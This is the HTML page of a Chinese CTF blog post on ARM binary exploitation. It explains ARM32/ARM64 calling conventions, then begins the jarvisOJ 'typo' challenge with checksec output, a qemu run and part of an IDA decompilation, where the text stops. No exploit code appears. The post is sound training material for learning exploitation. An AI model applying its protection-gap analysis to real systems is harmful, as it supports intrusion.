@@ -1,0 +1,884 @@
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅   异架构 Arm"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅   异架构 Arm"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-07-19 13:26:25 +0800 +0800"><meta property="article:modified_time" content="2025-07-19 22:03:03 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1752933845"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 异架构 Arm - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>lhon901's blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description></p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-example"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>语法示例
+<span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>语法高亮</a></li><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>数学公式</a></li><li class=menu-child-item><a href=/post/11-mermaid-charts class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>流程图</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>20</span></a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#arm-汇编速探>Arm 汇编速探</a><ul><li><a href=#函数调用约定>函数调用约定</a><ul><li><a href=#arm32aarch32调用约定>ARM32（AArch32）调用约定</a></li><li><a href=#arm64aarch64调用约定>ARM64（AArch64）调用约定</a></li><li><a href=#主要区别>主要区别</a></li></ul></li></ul></li><li><a href=#例题>例题</a></li><li><a href=#总结>总结</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=lhon901 src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>lhon901</p><div class=site-description itemprop=description>不想写博客...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>20</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>2</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>3</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/craftopc title="Github → https://github.com/craftopc" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github
+</a></span><span class=links-of-social-item><a href=mailto:lhon901@163.com title="E-Mail → mailto:lhon901@163.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
+E-Mail</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>凡梦星尘空间站</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=47326></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=102></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-07-19 22:03:03 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/hugo-next rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
+</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="不想写博客..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从零开始的 Pwn 之旅   异架构 Arm"><meta itemprop=description content="Arm 汇编速探
+
+函数调用约定
+
+
+ TODO: 待完善
+
+ARM32（AArch32）调用约定
+
+
+
+前 4 个参数：r0 ~ r3
+
+
+返回值：r0
+
+
+多余参数：栈上传递，从右往左入栈
+
+
+堆栈平衡：被调用函数负责
+
+
+函数调用：bl/b，返回用 bx lr 或 mov pc, lr"></span><header class=post-header><h1 class=post-title itemprop="name headline">从零开始的 Pwn 之旅 异架构 Arm
+<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20%e5%bc%82%e6%9e%b6%e6%9e%84%20arm.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
+</span><span class=post-meta-item-text title=发表于>发表于：
+</span><time title="创建时间：2025-07-19 13:26:25 +08:00" itemprop="dateCreated datePublished" datetime="2025-07-19 13:26:25 +0800 +0800">2025-07-19
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar-check"></i>
+</span><span class=post-meta-item-text title=更新于>更新于：
+</span><time title="修改时间：2025-07-19 22:03:03 +08:00" itemprop="dateModified dateLastmod" datetime="2025-07-19 22:03:03 +0800 +0800">2025-07-19
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
+</span><span class=post-meta-item-text title=分类于>分类于：
+</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>Ctf</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
+</span><span class=post-meta-item-text>字数：</span>
+<span>2969</span>
+</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
+</span><span class=post-meta-item-text>阅读：&ap;</span>
+<span>6分钟</span>
+</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
+</span><span class=post-meta-item-text>浏览：
+</span><span id=busuanzi_value_page_pv data-path=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E5%BC%82%E6%9E%B6%E6%9E%84-arm/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h2 id=arm-汇编速探>Arm 汇编速探
+<a class=header-anchor href=#arm-%e6%b1%87%e7%bc%96%e9%80%9f%e6%8e%a2></a></h2><h3 id=函数调用约定>函数调用约定
+<a class=header-anchor href=#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a></a></h3><ul><li><input disabled type=checkbox> TODO: 待完善</li></ul><h4 id=arm32aarch32调用约定>ARM32（AArch32）调用约定
+<a class=header-anchor href=#arm32aarch32%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a></a></h4><ul><li><p>前 4 个参数：<code>r0 ~ r3</code></p></li><li><p>返回值：<code>r0</code></p></li><li><p>多余参数：栈上传递，<strong>从右往左</strong>入栈</p></li><li><p>堆栈平衡：<strong>被调用函数</strong>负责</p></li><li><p>函数调用：<code>bl</code>/<code>b</code>，返回用 <code>bx lr</code> 或 <code>mov pc, lr</code></p><a id=more></a></li><li><p>寄存器：<code>pc</code>（程序计数器），<code>lr</code>（链接寄存器，保存返回地址）</p></li><li><p><code>LDR</code> 指令</p><ul><li><code>LDR r0, [r1]</code>：将 <code>r1</code> 指向的内存地址的值加载到 <code>r0</code></li><li><code>LDR r0, [r1, #4]</code>：将 <code>r1 + 4</code> 地址的值加载到 <code>r0</code></li><li><code>LDR r0, [r1, r2]</code>：将 <code>r1 + r2</code> 地址的值加载到 <code>r0</code></li></ul></li></ul><h4 id=arm64aarch64调用约定>ARM64（AArch64）调用约定
+<a class=header-anchor href=#arm64aarch64%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a></a></h4><ul><li>前 8 个参数：<code>x0 ~ x7</code></li><li>返回值：<code>x0</code></li><li>多余参数：依然通过栈传递，但栈对齐要求更高（16 字节对齐），参数顺序依然是<strong>从右往左</strong>入栈</li><li>堆栈平衡：<strong>被调用函数</strong>负责</li><li>函数调用：<code>bl</code>/<code>bl &lt;label></code>，返回用 <code>ret</code></li><li>寄存器：<ul><li><code>pc</code>（程序计数器，通常不可直接访问）</li><li><code>lr</code>/<code>x30</code>（链接寄存器，保存返回地址）</li></ul></li></ul><h4 id=主要区别>主要区别
+<a class=header-anchor href=#%e4%b8%bb%e8%a6%81%e5%8c%ba%e5%88%ab></a></h4><table><thead><tr><th>对比项</th><th>ARM32 (AArch32)</th><th>ARM64 (AArch64)</th></tr></thead><tbody><tr><td>参数传递</td><td>4 个寄存器（r0~r3）</td><td>8 个寄存器（x0~x7）</td></tr><tr><td>返回值</td><td>r0</td><td>x0</td></tr><tr><td>多余参数</td><td>栈传递，右→左</td><td>栈传递，右→左，16字节对齐</td></tr><tr><td>返回指令</td><td>bx lr / mov pc, lr</td><td>ret (等价于 ret x30)</td></tr><tr><td>寄存器命名</td><td>r0~r12, sp(r13), lr(r14), pc(r15)</td><td>x0~x30, sp, lr(x30), pc</td></tr><tr><td>栈对齐</td><td>无特殊要求</td><td>16 字节对齐</td></tr></tbody></table><h2 id=例题>例题
+<a class=header-anchor href=#%e4%be%8b%e9%a2%98></a></h2><p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/arm/jarvisOJ_typo title="jarvisoj - typo" rel="noopener external nofollow noreferrer" target=_blank class=exturl>jarvisoj - typo
+<i class="fa fa-external-link-alt"></i></a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1> 1</a>
+</span><span class=lnt id=hl-0-2><a class=lnlinks href=#hl-0-2> 2</a>
+</span><span class=lnt id=hl-0-3><a class=lnlinks href=#hl-0-3> 3</a>
+</span><span class=lnt id=hl-0-4><a class=lnlinks href=#hl-0-4> 4</a>
+</span><span class=lnt id=hl-0-5><a class=lnlinks href=#hl-0-5> 5</a>
+</span><span class=lnt id=hl-0-6><a class=lnlinks href=#hl-0-6> 6</a>
+</span><span class=lnt id=hl-0-7><a class=lnlinks href=#hl-0-7> 7</a>
+</span><span class=lnt id=hl-0-8><a class=lnlinks href=#hl-0-8> 8</a>
+</span><span class=lnt id=hl-0-9><a class=lnlinks href=#hl-0-9> 9</a>
+</span><span class=lnt id=hl-0-10><a class=lnlinks href=#hl-0-10>10</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ pwn checksec ./typo                                                                                                       <span class=o>(</span>.venv<span class=o>)</span> master ✱ ◼
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/arm/jarvisOJ_typo/typo&#39;</span>
+</span></span><span class=line><span class=cl>    Arch:       arm-32-little
+</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:      No canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8000<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ file ./typo                  <span class=o>(</span>.venv<span class=o>)</span> ✘ <span class=m>127</span> master ✱ ◼
+</span></span><span class=line><span class=cl>./typo: ELF 32-bit LSB executable, ARM, EABI5 version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, statically linked, <span class=k>for</span> GNU/Linux 2.6.32, BuildID<span class=o>[</span>sha1<span class=o>]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span></span></code></pre></td></tr></table></div></div><p>arm 32 位小端, 只开了 NX, 没有启用 ASLR, 也没有启用 canary, 静态链接</p><p>ida pro 反编译出了很多函数，<code>start</code> 函数无法反编译，我们来结合程序行为来确定 <code>main</code> 函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1>1</a>
+</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2>2</a>
+</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3>3</a>
+</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4>4</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/P/c/p/l/u/a/jarvisOJ_typo ❯❯❯ qemu-arm ./typo                                                                                                     <span class=o>(</span>.venv<span class=o>)</span> ✘ <span class=m>126</span> master ✱ ◼
+</span></span><span class=line><span class=cl>Let<span class=err>&#39;</span>s Do Some Typing Exercise~
+</span></span><span class=line><span class=cl>Press Enter to get start<span class=p>;</span>
+</span></span><span class=line><span class=cl>Input ~ <span class=k>if</span> you want to quit</span></span></code></pre></td></tr></table></div></div><p>搜索字符串 Let&rsquo;s Do Some Typing Exercise~ 后得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1> 1</a>
+</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2> 2</a>
+</span><span class=lnt id=hl-2-3><a class=lnlinks href=#hl-2-3> 3</a>
+</span><span class=lnt id=hl-2-4><a class=lnlinks href=#hl-2-4> 4</a>
+</span><span class=lnt id=hl-2-5><a class=lnlinks href=#hl-2-5> 5</a>
+</span><span class=lnt id=hl-2-6><a class=lnlinks href=#hl-2-6> 6</a>
+</span><span class=lnt id=hl-2-7><a class=lnlinks href=#hl-2-7> 7</a>
+</span><span class=lnt id=hl-2-8><a class=lnlinks href=#hl-2-8> 8</a>
+</span><span class=lnt id=hl-2-9><a class=lnlinks href=#hl-2-9> 9</a>
+</span><span class=lnt id=hl-2-10><a class=lnlinks href=#hl-2-10>10</a>
+</span><span class=lnt id=hl-2-11><a class=lnlinks href=#hl-2-11>11</a>
+</span><span class=lnt id=hl-2-12><a class=lnlinks href=#hl-2-12>12</a>
+</span><span class=lnt id=hl-2-13><a class=lnlinks href=#hl-2-13>13</a>
+</span><span class=lnt id=hl-2-14><a class=lnlinks href=#hl-2-14>14</a>
+</span><span class=lnt id=hl-2-15><a class=lnlinks href=#hl-2-15>15</a>
+</span><span class=lnt id=hl-2-16><a class=lnlinks href=#hl-2-16>16</a>
+</span><span class=lnt id=hl-2-17><a class=lnlinks href=#hl-2-17>17</a>
+</span><span class=lnt id=hl-2-18><a class=lnlinks href=#hl-2-18>18</a>
+</span><span class=lnt id=hl-2-19><a class=lnlinks href=#hl-2-19>19</a>
+</span><span class=lnt id=hl-2-20><a class=lnlinks href=#hl-2-20>20</a>
+</span><span class=lnt id=hl-2-21><a class=lnlinks href=#hl-2-21>21</a>
+</span><span class=lnt id=hl-2-22><a class=lnlinks href=#hl-2-22>22</a>
+</span><span class=lnt id=hl-2-23><a class=lnlinks href=#hl-2-23>23</a>
+</span><span class=lnt id=hl-2-24><a class=lnlinks href=#hl-2-24>24</a>
+</span><span class=lnt id=hl-2-25><a class=lnlinks href=#hl-2-25>25</a>
+</span><span class=lnt id=hl-2-26><a class=lnlinks href=#hl-2-26>26</a>
+</span><span class=lnt id=hl-2-27><a class=lnlinks href=#hl-2-27>27</a>
+</span><span class=lnt id=hl-2-28><a class=lnlinks href=#hl-2-28>28</a>
+</span><span class=lnt id=hl-2-29><a class=lnlinks href=#hl-2-29>29</a>
+</span><span class=lnt id=hl-2-30><a class=lnlinks href=#hl-2-30>30</a>
+</span><span class=lnt id=hl-2-31><a class=lnlinks href=#hl-2-31>31</a>
+</span><span class=lnt id=hl-2-32><a class=lnlinks href=#hl-2-32>32</a>
+</span><span class=lnt id=hl-2-33><a class=lnlinks href=#hl-2-33>33</a>
+</span><span class=lnt id=hl-2-34><a class=lnlinks href=#hl-2-34>34</a>
+</span><span class=lnt id=hl-2-35><a class=lnlinks href=#hl-2-35>35</a>
+</span><span class=lnt id=hl-2-36><a class=lnlinks href=#hl-2-36>36</a>
+</span><span class=lnt id=hl-2-37><a class=lnlinks href=#hl-2-37>37</a>
+</span><span class=lnt id=hl-2-38><a class=lnlinks href=#hl-2-38>38</a>
+</span><span class=lnt id=hl-2-39><a class=lnlinks href=#hl-2-39>39</a>
+</span><span class=lnt id=hl-2-40><a class=lnlinks href=#hl-2-40>40</a>
+</span><span class=lnt id=hl-2-41><a class=lnlinks href=#hl-2-41>41</a>
+</span><span class=lnt id=hl-2-42><a class=lnlinks href=#hl-2-42>42</a>
+</span><span class=lnt id=hl-2-43><a class=lnlinks href=#hl-2-43>43</a>
+</span><span class=lnt id=hl-2-44><a class=lnlinks href=#hl-2-44>44</a>
+</span><span class=lnt id=hl-2-45><a class=lnlinks href=#hl-2-45>45</a>
+</span><span class=lnt id=hl-2-46><a class=lnlinks href=#hl-2-46>46</a>
+</span><span class=lnt id=hl-2-47><a class=lnlinks href=#hl-2-47>47</a>
+</span><span class=lnt id=hl-2-48><a class=lnlinks href=#hl-2-48>48</a>
+</span><span class=lnt id=hl-2-49><a class=lnlinks href=#hl-2-49>49</a>
+</span><span class=lnt id=hl-2-50><a class=lnlinks href=#hl-2-50>50</a>
+</span><span class=lnt id=hl-2-51><a class=lnlinks href=#hl-2-51>51</a>
+</span><span class=lnt id=hl-2-52><a class=lnlinks href=#hl-2-52>52</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>sub_8F00</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// r3
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-34h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// [sp+4h] [bp-30h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v11</span><span class=p>;</span> <span class=c1>// [sp+8h] [bp-2Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v12</span><span class=p>;</span> <span class=c1>// [sp+10h] [bp-24h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v13</span><span class=p>;</span> <span class=c1>// [sp+14h] [bp-20h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v14</span><span class=p>;</span> <span class=c1>// [sp+18h] [bp-1Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v15</span><span class=p>;</span> <span class=c1>// [sp+1Ch] [bp-18h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v16</span><span class=p>;</span> <span class=c1>// [sp+20h] [bp-14h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v17</span><span class=p>;</span> <span class=c1>// [sp+24h] [bp-10h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v17</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v16</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sub_11D04</span><span class=p>(</span><span class=n>off_A1538</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>a2</span><span class=p>,</span> <span class=n>a1</span><span class=p>);</span>
